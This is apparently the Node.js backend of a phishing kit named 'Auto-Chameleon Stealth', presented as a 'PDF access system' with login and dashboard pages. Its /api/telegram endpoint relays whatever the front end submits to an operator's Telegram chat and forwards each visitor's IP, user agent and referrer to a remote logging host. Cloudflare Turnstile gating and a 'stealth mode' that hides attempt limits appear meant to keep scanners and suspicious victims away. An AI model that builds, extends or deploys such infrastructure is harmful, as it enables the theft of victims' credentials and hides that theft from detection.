// ============================================================
//  AUTO-CHAMELEON STEALTH v3.0 - BACKEND
//  Full PDF Access System with Cloudflare Protection
// ============================================================

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
//  CONFIGURATION
// ============================================================

const CONFIG = {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    BACKEND_URL: process.env.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com',
    ALLOWED_ORIGINS: process.env.ALLOWED_ORIGINS || 'https://*.netlify.app,http://localhost:3000',
    TURNSTILE_SECRET_KEY: process.env.TURNSTILE_SECRET_KEY,
    MAX_ATTEMPTS: 5,
    LOCKOUT_TIME: 60000,
    REQUIRED_MATCHES: 2
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║     🦎  AUTO-CHAMELEON STEALTH v3.0                      ║');
console.log('║     🔐  Full Stealth PDF Access System                   ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   PORT: ${PORT}`);
console.log(`║   TELEGRAM: ${CONFIG.TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log(`║   BACKEND: ${CONFIG.BACKEND_URL}`);
console.log(`║   STEALTH MODE: ${CONFIG.MAX_ATTEMPTS} attempts (hidden)`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  MIDDLEWARE
// ============================================================

const allowedOrigins = CONFIG.ALLOWED_ORIGINS.split(',').map(o => o.trim());

app.use(cors({
    origin: function(origin, callback) {
        if (!origin || allowedOrigins.some(o => origin.match(new RegExp(o.replace('*', '.*'))))) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
//  TELEGRAM FUNCTIONS
// ============================================================

async function sendTelegram(message, parseMode = 'Markdown') {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Not configured');
        return false;
    }

    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: parseMode,
                disable_web_page_preview: true
            },
            { timeout: 10000 }
        );
        console.log('[TELEGRAM] ✅ Sent');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Error:', error.message);
        return false;
    }
}

// ============================================================
//  ROUTES
// ============================================================

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        service: 'Auto-Chameleon Stealth',
        version: '3.0.0',
        stealth: true
    });
});

// ============================================================
//  TELEGRAM ENDPOINT
// ============================================================

app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parse_mode = 'Markdown', data } = req.body;

        console.log('[TELEGRAM] 📨 Message received');

        // Send to Telegram
        const success = await sendTelegram(message, parse_mode);

        // Log to backend if configured
        if (CONFIG.BACKEND_URL && data) {
            try {
                await axios.post(`${CONFIG.BACKEND_URL}/api/log-action`, {
                    action: 'telegram_forward',
                    data: data,
                    visitorInfo: {
                        fullUrl: req.headers.referer || 'Unknown',
                        userAgent: req.headers['user-agent'] || 'Unknown',
                        ip: req.ip || 'unknown'
                    }
                });
            } catch (e) {}
        }

        res.json({ success, message: success ? 'Sent' : 'Failed' });
    } catch (error) {
        console.error('[TELEGRAM] Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
//  LOG ENDPOINT
// ============================================================

app.post('/api/log', (req, res) => {
    const data = req.body;
    console.log('[LOG]', JSON.stringify(data, null, 2));
    res.json({ success: true });
});

// ============================================================
//  VERIFY TURNSTILE
// ============================================================

app.post('/api/verify-turnstile', async (req, res) => {
    try {
        const { token } = req.body;

        if (!token) {
            return res.status(400).json({ success: false, error: 'No token provided' });
        }

        if (!CONFIG.TURNSTILE_SECRET_KEY) {
            // If no secret key, just accept (for testing)
            return res.json({ success: true, message: 'Test mode - accepted' });
        }

        const response = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            new URLSearchParams({
                secret: CONFIG.TURNSTILE_SECRET_KEY,
                response: token
            })
        );

        if (response.data.success) {
            res.json({ success: true, data: response.data });
        } else {
            res.status(400).json({ success: false, error: 'Verification failed', data: response.data });
        }
    } catch (error) {
        console.error('[TURNSTILE] Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
//  SERVE FRONTEND
// ============================================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ============================================================
//  START SERVER
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health: http://localhost:${PORT}/health`);
    console.log(`📤 Telegram: http://localhost:${PORT}/api/telegram`);
    console.log(`🦎 Stealth mode: ACTIVE (no visible indicators)`);
});

// ============================================================
//  ERROR HANDLING
// ============================================================

process.on('uncaughtException', (err) => {
    console.error('🔥 Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 Unhandled Rejection:', reason);
});